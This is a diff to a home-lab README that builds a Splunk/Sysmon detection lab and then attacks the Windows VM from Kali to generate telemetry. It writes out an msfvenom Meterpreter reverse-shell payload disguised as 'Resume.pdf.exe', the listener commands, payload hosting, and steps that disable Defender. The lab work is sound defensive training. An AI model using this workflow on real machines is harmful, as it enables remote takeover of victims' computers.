@@ -26,26 +26,29 @@ powershell# Download Sysmon + Olaf config from GitHub
 
 4. Configure Splunk Data Input
 
-Create index: endpoint
-
 Head to your Inputs.conf file which will be found in your Splunk>etc>System>local> inputs.conf (If you don't see this file here, copy it over from your 'Default' file)
 
 ![image](https://github.com/user-attachments/assets/c63e8e12-651b-49f2-974d-96dbd72daa68)
 Input this into your inputs.conf file
 
 5. Create index endpoint
+   
 After establishing Splunk is installed, with sysmon added with olaf configuration, head to Splunk via localhost:8000 in Microsoft Edge > Settings > Indexes > New Index > In the Index name field enter "endpoint" and hit save.
 
 6. Change Network Adapter Setting
+
 You can now close and create a snapshot as a baseline, and change the network configuration in Virtualbox via settings > Internal network and ensure the name is the same name used for the Kali Linux machine.
 
 7. Set a static IP Address
+
 Change the network adapter settings and disable DHCP and configure the static IP address to the address we listed earlier. (192.168.20.10)
 
 8. Disable Windows Defender
+
 Turn off Real-time Protection (Settings > Update & Security > Windows Security)
 
 9. Enable RDP
+
 Settings > System > Remote Desktop > Enable
 
 
@@ -56,13 +59,16 @@ To test you are in the same internal network, run the terminal in Linux and ping
 
 🎯 Attack Simulation
 1. Reconnaissance
+
 nmap -A 192.168.20.10 -Pn
 Port 3389 (RDP) should be open
 
-3. Create Payload
+2. Create Payload
+
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
 
-5. Start Listener
+3. Start Listener
+
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -70,21 +76,24 @@ set lhost 192.168.20.11
 set lport 4444
 exploit
 
-7. Host Payload
-bash# New terminal
+4. Host Payload
+
+bash New terminal
 python3 -m http.server 9999
 
-8. Execute on Windows🖥️ 
+5. Execute on Windows🖥️ 
 
 Browse to 192.168.20.11:9999
 Download and run Resume.pdf.exe
 Verify meterpreter connection
 
-9. 🐧Establish connection to Windows from Linux machine
+6. 🐧Establish connection to Windows from Linux machine
+
 Run shell in the mepterpreter to establish a connection to the Windows machine.
    ![image](https://github.com/user-attachments/assets/ad2933e0-fc72-4b32-b9c5-f6e321cb6f7c)
 
-10. Run commands to create telemetry for SIEM
+7. Run commands to create telemetry for SIEM
+
 On the Linux machine run these three basic recon commands to 
 net user
 net localgroup
